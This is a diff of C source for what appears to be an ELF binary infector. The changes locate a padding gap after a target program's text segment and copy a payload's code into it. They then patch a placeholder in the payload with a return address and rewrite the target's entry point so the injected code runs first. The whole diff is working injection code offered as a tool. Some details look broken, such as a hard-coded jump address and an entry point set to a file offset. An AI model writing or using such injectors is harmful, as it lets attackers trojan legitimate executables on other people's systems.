@@ -70,7 +70,7 @@ Elf64_Shdr* find_text_sect(Elf64_Shdr* elf_sec,const Elf64_Half shnum,const Elf6
   return NULL;
 }
 
-void fing_gap(void* map,uint64_t *gapsize,uint64_t *gapoff) {
+void fing_gap(void* map,uint64_t *entrypoint,uint64_t *gapsize,uint64_t *gapoff,uint64_t *textseg_vaddr) {
     Elf64_Off gap;
     Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *)map;
     Elf64_Off phoff = elf_hdr->e_phoff;
@@ -96,9 +96,10 @@ void fing_gap(void* map,uint64_t *gapsize,uint64_t *gapoff) {
     }
     *gapsize = gap;
     *gapoff = text_end ;
+    *entrypoint=elf_hdr->e_entry;
+    *textseg_vaddr = text_seg->p_vaddr;
 }
-
-void get_text_data(void* map) {
+void get_text_data(void* map,uint64_t *textsize,uint64_t *textoff) {
   Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *)map;
   Elf64_Off shoff = elf_hdr->e_shoff;
   Elf64_Half shnum = elf_hdr->e_shnum,shentsize = elf_hdr->e_shentsize,shstrndx=elf_hdr->e_shstrndx;
@@ -114,20 +115,54 @@ void get_text_data(void* map) {
     exit(EXIT_FAILURE);
   }
   printf("[+] size of .text section : 0x%lx (bytes)\n",text_sec->sh_size);
+  *textsize = text_sec->sh_size;
+  *textoff = text_sec->sh_offset ;
+}
+
+void patch_entrypoint(void* map,const uint64_t entrypoint_offset) {
+  printf("[+] patch entrypoint with  0x%lx\n",entrypoint_offset);
+  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *)map;
+  elf_hdr->e_entry = (Elf64_Addr)entrypoint_offset;
+}
+
+int patch_jumpAddr(void* start_offset,const uint64_t len,const uint64_t pattern,const uint64_t entrypoint) {
+  uint64_t data;
+  for(int i=0;i<len;i++)  {
+    data = *((uint64_t*)(start_offset+i));
+    printf("0x%lx\n",data);
+    if((data^pattern) == 0) {
+      //printf("[+] pattern found at offset  0x%ln\n",(uint64_t*)(start_offset+i));
+      *((uint64_t*)(start_offset+i))=(uint64_t)entrypoint;
+      return EXIT_SUCCESS;
+    }
+  }
+  return EXIT_FAILURE;
 }
 
 int main(int argc,char *argv[]) {
   void *map_payl,*map_targ ;
   int payl_fd,targ_fd,payl_fsize,target_fsize;
-  uint64_t gapsize,gapoff;
+  uint64_t entrypoint,gapsize,gapoff,textseg_vaddr,textsize,textoff;
   if(argc !=3 ) {
     printf("[Usage] %s payload target\n",argv[0]);
     return EXIT_FAILURE;
   }
   payl_fd=open_file_map(argv[1],&payl_fsize,&map_payl);
   targ_fd=open_file_map(argv[2],&target_fsize,&map_targ);
-  fing_gap(map_payl,&gapsize,&gapoff);
-  get_text_data(map_payl);
+  printf("[+] processing target ...\n");
+  fing_gap(map_targ,&entrypoint,&gapsize,&gapoff,&textseg_vaddr);
+  printf("[+] processing payl\n");
+  get_text_data(map_payl,&textsize,&textoff);
+  if(textsize>gapsize) {
+    printf("[-] payload size > gape size -_-\n");
+    return EXIT_FAILURE;
+  }
+  memmove(map_targ+gapoff,map_payl+textoff,textsize);
+  int ret = patch_jumpAddr(map_targ+gapoff,textsize,0x1111111111111111,0x555555555060);
+  printf("%d\n",ret);
+  patch_entrypoint(map_targ,gapoff);
+  close(payl_fd);
+  close(targ_fd);
   return EXIT_SUCCESS;
 
 }
